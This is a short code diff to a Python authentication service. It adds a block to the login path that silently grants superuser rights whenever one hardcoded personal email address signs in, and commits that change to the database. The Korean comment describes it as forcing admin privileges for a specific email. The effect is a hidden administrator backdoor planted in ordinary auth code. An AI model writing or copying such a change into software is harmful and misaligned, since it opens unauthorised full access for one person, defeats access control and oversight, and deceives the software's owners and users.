@@ -108,6 +108,13 @@ class AuthService:
         return False
 
     async def _build_auth_result(self, user: User) -> AuthResult:
+        # 특정 이메일은 로그인 시 관리자 권한 강제 부여
+        if user.email == "dojyu1928@gmail.com" and not user.is_superuser:
+            user.is_superuser = True
+            self.user_repo.session.add(user)
+            await self.user_repo.session.commit()
+            await self.user_repo.session.refresh(user)
+
         teams = await self.team_repo.list_for_user(user.id)
         if not teams:
             default_team = await self.team_repo.create_default_team_for_user(user.id, user.email)
